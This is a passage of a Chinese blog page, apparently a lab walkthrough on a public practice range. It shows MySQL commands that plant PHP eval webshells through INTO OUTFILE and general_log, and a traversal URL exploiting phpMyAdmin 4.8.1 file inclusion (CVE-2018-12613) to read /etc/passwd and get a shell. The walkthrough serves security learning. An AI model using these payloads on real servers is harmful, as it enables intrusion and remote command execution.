data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YmM5ZjIxYTEwNzM5OWRlMjg0ODRlMTI4NWNjZmYxNGVfZDYxMTAyMDkyYjFmNDVhMjgyNjAyZTQ5MjUzMjgyYjdfSUQ6NzYyOTU1ODQzOTIyODUwOTM5Nl8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">-- 查看是否有写入权限 
+show global variables like <span class="pl-s"><span class="pl-pds">'</span>%secure%<span class="pl-pds">'</span></span><span class="pl-k">;</span> 
+-- 写入webshell
+<span class="pl-k">select</span> <span class="pl-smi">'&lt;?php</span> @eval(<span class="pl-smi">$_POST</span>[shell])<span class="pl-k">;</span><span class="pl-k">?</span><span class="pl-k">&gt;</span><span class="pl-s"><span class="pl-pds">'</span> INTO OUTFILE <span class="pl-pds">'</span></span>/var/www/html/shell.php<span class="pl-s"><span class="pl-pds">'</span>;</span></pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0fddbee92448e3e95a208eede018bc73c8568942e4ce6e71bb0537571c75899f/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a5451784e6d59784d4459325932557a4e44517a4d5464694e44526b4e7a67335a6a55314d6d46684e3252665a6a63304f5445344f4459794d7a49794d7a55304d4751794f574935596d46685954686a4e544d335a6d4a66535551364e7a59794f5455314f4459794d7a45794d6a6b324e7a51344f4638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/0fddbee92448e3e95a208eede018bc73c8568942e4ce6e71bb0537571c75899f/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a5451784e6d59784d4459325932557a4e44517a4d5464694e44526b4e7a67335a6a55314d6d46684e3252665a6a63304f5445344f4459794d7a49794d7a55304d4751794f574935596d46685954686a4e544d335a6d4a66535551364e7a59794f5455314f4459794d7a45794d6a6b324e7a51344f4638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTQxNmYxMDY2Y2UzNDQzMTdiNDRkNzg3ZjU1MmFhN2RfZjc0OTE4ODYyMzIyMzU0MGQyOWI5YmFhYThjNTM3ZmJfSUQ6NzYyOTU1ODYyMzEyMjk2NzQ4OF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b95b4615c03755c27e0f90ceff4619f53639a2e085d1f2bb7cc4b2fe224f0091/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e544931597a5177597a637a4e5441354e44526b595455775a54597a597a45795a54457a4f474e6c596a5266595452684d324e6b4d324e684d4745344e7a4e6b4d5459354e7a5535595463354f5463354d7a63304f545666535551364e7a59794f5455314f4467794d4459354e5463334d6a45774e3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/b95b4615c03755c27e0f90ceff4619f53639a2e085d1f2bb7cc4b2fe224f0091/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e544931597a5177597a637a4e5441354e44526b595455775a54597a597a45795a54457a4f474e6c596a5266595452684d324e6b4d324e684d4745344e7a4e6b4d5459354e7a5535595463354f5463354d7a63304f545666535551364e7a59794f5455314f4467794d4459354e5463334d6a45774e3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTI1YzQwYzczNTA5NDRkYTUwZTYzYzEyZTEzOGNlYjRfYTRhM2NkM2NhMGE4NzNkMTY5NzU5YTc5OTc5Mzc0OTVfSUQ6NzYyOTU1ODgyMDY5NTc3MjEwN18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p>由于是公用靶场，所以已经有shell了，可以直接使用</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/223b6bf1dc65ec2ce0d186098a10294d38a6fccb691329980557740419f272ea/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d475978596d59775954566d4d7a686c4e4745314f54646a4d475a6b5a54466b4e6a466b4e7a5979596d5266596d4d774e44557a593251795a6d51774e6d4e6c595464684d446b34597a41774d6a4d344e446b3359575666535551364e7a59794f5455314f5441334d6a49354d5455334d6a6b324e4638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/223b6bf1dc65ec2ce0d186098a10294d38a6fccb691329980557740419f272ea/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d475978596d59775954566d4d7a686c4e4745314f54646a4d475a6b5a54466b4e6a466b4e7a5979596d5266596d4d774e44557a593251795a6d51774e6d4e6c595464684d446b34597a41774d6a4d344e446b3359575666535551364e7a59794f5455314f5441334d6a49354d5455334d6a6b324e4638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGYxYmYwYTVmMzhlNGE1OTdjMGZkZTFkNjFkNzYyYmRfYmMwNDUzY2QyZmQwNmNlYTdhMDk4YzAwMjM4NDk3YWVfSUQ6NzYyOTU1OTA3MjI5MTU3Mjk2NF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<h2>若无法通过SELECT语句写入文件，则可以尝试使用日志文件来写入webshell</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 查看general日志文件配置情况 </span>
+show global variables <span class="pl-k">like</span> <span class="pl-s"><span class="pl-pds">"</span>%general%<span class="pl-pds">"</span></span>; 
+<span class="pl-c"><span class="pl-c">--</span> 通过设置general_log选项设置日志写入路径 </span>
+<span class="pl-k">set</span> global general_log<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>on<span class="pl-pds">'</span></span>; 
+<span class="pl-k">SET</span> global general_log_file<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>/var/www/html/cmd.php<span class="pl-pds">'</span></span>; 
+<span class="pl-c"><span class="pl-c">--</span> 在查询中执行语句，写入webshell </span>
+<span class="pl-k">SELECT</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;?php eval($_POST["cmd"]);?&gt;<span class="pl-pds">'</span></span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/98eddb56d379454b9849599609de38ed5d124de4c44cd1d250fd1b32ebbf4110/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f445534595755794d7a6b335a5756685a6a4e694e544a6a4d545a685a5451314f4456695a54593159544e665a6d4932595751344e7a45324d6d52694d7a41335a6d597a596d4a6d59544e6d4e4751795a4445335a446c66535551364e7a59794f5455314f5449344f54417a4f54677a4e4441314e5638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/98eddb56d379454b9849599609de38ed5d124de4c44cd1d250fd1b32ebbf4110/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f445534595755794d7a6b335a5756685a6a4e694e544a6a4d545a685a5451314f4456695a54593159544e665a6d4932595751344e7a45324d6d52694d7a41335a6d597a596d4a6d59544e6d4e4751795a4445335a446c66535551364e7a59794f5455314f5449344f54417a4f54677a4e4441314e5638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODU4YWUyMzk3ZWVhZjNiNTJjMTZhZTQ1ODViZTY1YTNfZmI2YWQ4NzE2MmRiMzA3ZmYzYmJmYTNmNGQyZDE3ZDlfSUQ6NzYyOTU1OTI4OTAzOTgzNDA1NV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f5070017f2d767ae2b21246e7861a3106853e245dd95364808864ffb6a08cf3d/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d6d466c4e6a63345a6a67324e5751335a546b354d6d51315954646d4d444e6c4e446b7a4d444d35593256665a5455775a6a4d314d44646d4e7a55794d7a466a597a41784d6d46694d4745315a6d46694e6a497a4d544a66535551364e7a59794f5455314f5463774e5463354f4463774f4445354d6c38784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/f5070017f2d767ae2b21246e7861a3106853e245dd95364808864ffb6a08cf3d/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d6d466c4e6a63345a6a67324e5751335a546b354d6d51315954646d4d444e6c4e446b7a4d444d35593256665a5455775a6a4d314d44646d4e7a55794d7a466a597a41784d6d46694d4745315a6d46694e6a497a4d544a66535551364e7a59794f5455314f5463774e5463354f4463774f4445354d6c38784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MmFlNjc4Zjg2NWQ3ZTk5MmQ1YTdmMDNlNDkzMDM5Y2VfZTUwZjM1MDdmNzUyMzFjYzAxMmFiMGE1ZmFiNjIzMTJfSUQ6NzYyOTU1OTcwNTc5ODcwODE5Ml8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/609a09b187e2b10e27072e8ed8134960d7c55f9de4592478654362cb8f0daa0b/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d6d5534593246685a6a6c6b4e6a6735597a6c694d44417a4e7a466c4e544d3259546b79596a4d7a4f5456664e54453459574d324e6d49345a6d4e68597a5a6d4e6a4134596a4d314e7a6b305a5451345a574d354e474e66535551364e7a59794f5455324d4441334e5449324e6a63794d6a63334d3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/609a09b187e2b10e27072e8ed8134960d7c55f9de4592478654362cb8f0daa0b/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d6d5534593246685a6a6c6b4e6a6735597a6c694d44417a4e7a466c4e544d3259546b79596a4d7a4f5456664e54453459574d324e6d49345a6d4e68597a5a6d4e6a4134596a4d314e7a6b305a5451345a574d354e474e66535551364e7a59794f5455324d4441334e5449324e6a63794d6a63334d3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MmU4Y2FhZjlkNjg5YzliMDAzNzFlNTM2YTkyYjMzOTVfNTE4YWM2NmI4ZmNhYzZmNjA4YjM1Nzk0ZTQ4ZWM5NGNfSUQ6NzYyOTU2MDA3NTI2NjcyMjc3M18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<h2>phpmyadmin4.8.1远程文件包含漏洞（<a title="CVE-2018-12613" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-x394-g9j8-x7mf/hovercard" href="https://github.com/advisories/GHSA-x394-g9j8-x7mf">CVE-2018-12613</a>）</h2>
+<p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一</p>
+<p>处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
+<p>利用前提：</p>
+<p>能进进入管理页面，通过弱口令等方式</p>
+<h3>1.访问 <a href="http://ip/index%5C.php?target=db%5C_sql%5C.php%253f/%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./etc/passwd" rel="nofollow">http://ip/index\.php?target=db\_sql\.php%253f/\.\./\.\./\.\./\.\./\.\./\.\./\.\./\.\./etc/passwd</a> 页面，验证是否存在漏洞</h3>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b2fc90e54441c471dfb661059bbbc4bd745b258cd7c14cca27076cdc6396d6f9/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d7a4d77595455354e4449315a474d7a5a545a6a4d54566c5a54426c5a44517a4f474579595451774f544a664e44497a4e6a497a59324d334f57526a5a4449314f545135597a67314f4445304d5749334f5451344d6d4a66535551364e7a59794f5455324d4463784e444d774e6a557a4f4451794e3138784e7a6b7a4f544d7a4d6a55334f6a45334f5451774d546b324e546466566a4d"><img src="https://camo.githubusercontent.com/b2fc90e54441c471dfb661059bbbc4bd745b258cd7c14cca27076cdc6396d6f9/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d7a4d77595455354e4449315a474d7a5a545a6a4d54566c5a54426c5a44517a4f474579595451774f544a664e44497a4e6a497a59324d334f57526a5a4449314f545135597a67314f4445304d5749334f5451344d6d4a66535551364e7a59794f5455324d4463784e444d774e6a557a4f4451794e3138784e7a6b7a4f544d7a4d6a55334f6a45334f5451774d546b324e546466566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MzMwYTU5NDI1ZGMzZTZjMTVlZTBlZDQzOGEyYTQwOTJfNDIzNjIzY2M3OWRjZDI1OTQ5Yzg1ODE0MWI3OTQ4MmJfSUQ6NzYyOTU2MDcxNDMwNjUzODQyN18xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM" style="max-width: 100%;"></a></p>
+<h3>2.执行 sql 语句写入php代码SELECT "&lt;?php phpinfo();?&gt;";</h3>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b540f112ce0c5e57432e854e8efc9078904a6461ae18d8f1424379ff93b7b8c9/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a6d4e69596a42684e4745314d4467775a545a6c5a574e685a6a686b4f5459784d6a51335a4449315a5468664f57466959545978595755344f474a6d4d325577597a6c69596a56684d32597a5a5451334f4751794e544e66535551364e7a59794f5455324d446b7a4e6a637a4e4459304d544d304d3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/b540f112ce0c5e57432e854e8efc9078904a6461ae18d8f1424379ff93b7b8c9/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a6d4e69596a42684e4745314d4467775a545a6c5a574e685a6a686b4f5459784d6a51335a4449315a5468664f57466959545978595755344f474a6d4d325577597a6c69596a56684d32597a5a5451334f4751794e544e66535551364e7a59794f5455324d446b7a4e6a637a4e4459304d544d304d3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmNiYjBhNGE1MDgwZTZlZWNhZjhkOTYxMjQ3ZDI1ZThfOWFiYTYxYWU4OGJmM2UwYzliYjVhM2YzZTQ3OGQyNTNfSUQ6NzYyOTU2MDkzNjczNDY0MTM0M18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<h3>3.查看自己的 seesionid</h3>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/99879159e429e9513d490da347d43b9f6ed81711a168420e4d4af36872baa285/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e6a51354e546c6a5a6d4a6d4e54526c4d4441774d5449794e4745784d546b3559575a6a596d4d775a5752664d6d597a4e54646b4f44566b4d4445784d57566a59546377595749775a6a6b784e7a637a5a444e6b596a4e66535551364e7a59794f5455324d5445344d6a59344e4455344d5441324d4638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/99879159e429e9513d490da347d43b9f6ed81711a168420e4d4af36872baa285/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e6a51354e546c6a5a6d4a6d4e54526c4d4441774d5449794e4745784d546b3559575a6a596d4d775a5752664d6d597a4e54646b4f44566b4d4445784d57566a59546377595749775a6a6b784e7a637a5a444e6b596a4e66535551364e7a59794f5455324d5445344d6a59344e4455344d5441324d4638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjQ5NTljZmJmNTRlMDAwMTIyNGExMTk5YWZjYmMwZWRfMmYzNTdkODVkMDExMWVjYTcwYWIwZjkxNzczZDNkYjNfSUQ6NzYyOTU2MTE4MjY4NDU4MTA2MF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<h3>4.访问<a href="http://ip/index%5C.php?target=db%5C_sql%5C.php%253f/%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./%5C.%5C./tmp/sess%5C_sessid%E5%8D%B3%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8D%B3%E5%8F%AF" rel="nofollow">http://ip/index\.php?target=db\_sql\.php%253f/\.\./\.\./\.\./\.\./\.\./\.\./\.\./\.\./tmp/sess\_sessid即包含session文件，即可</a> getshell</h3>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/890b78fecf442f542107c5f0fb4320740214232a08c03b64190808d83b1f633c/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f545a6b4f475134595463344e4463784f544131597a67315a5455354f4441784f44566859325a684e546c66597a4268597a4d774e6a6332597a51354d7a49785a546868596a4532595751334f47526959545535596a5666535551364e7a59794f5455324d546b334e446b344d446b7a4f446b304f5638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/890b78fecf442f542107c5f0fb4320740214232a08c03b64190808d83b1f633c/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f545a6b4f475134595463344e4463784f544131597a67315a5455354f4441784f44566859325a684e546c66597a4268597a4d774e6a6332597a51354d7a49785a546868596a4532595751334f47526959545535596a5666535551364e7a59794f5455324d546b334e446b344d446b7a4f446b304f5638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTZkOGQ4YTc4NDcxOTA1Yzg1ZTU5ODAxODVhY2ZhNTlfYzBhYzMwNjc2YzQ5MzIxZThhYjE2YWQ3OGRiYTU5YjVfSUQ6NzYyOTU2MTk3NDk4MDkzODk0OV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a5340edfb117f798e195f8c262b61d266f91ff6cad88d6f3bb0088cc01fa1eae/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f5451344f4755794f4455784d3251774e44686a596d45335a44466b5a5759314e5745785a57457a4d444e664d7a49324f4759334e544578596d4a685954677a5a6a453159546c6a4d7a526c5a44457a5a4464685a446466535551364e7a59794f5455324d6a41354d6a49344d4455354e7a51334d6c38784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/a5340edfb117f798e195f8c262b61d266f91ff6cad88d6f3bb0088cc01fa1eae/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f5451344f4755794f4455784d3251774e44686a596d45335a44466b5a5759314e5745785a57457a4d444e664d7a49324f4759334e544578596d4a685954677a5a6a453159546c6a4d7a526c5a44457a5a4464685a446466535551364e7a59794f5455324d6a41354d6a49344d4455354e7a51334d6c38784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTQ4OGUyODUxM2QwNDhjYmE3ZDFkZWY1NWExZWEzMDNfMzI2OGY3NTExYmJhYTgzZjE1YTljMzRlZDEzZDdhZDdfSUQ6NzYyOTU2MjA5MjI4MDU5NzQ3Ml8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://P7IVESC.github.io">P7IVESC's blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
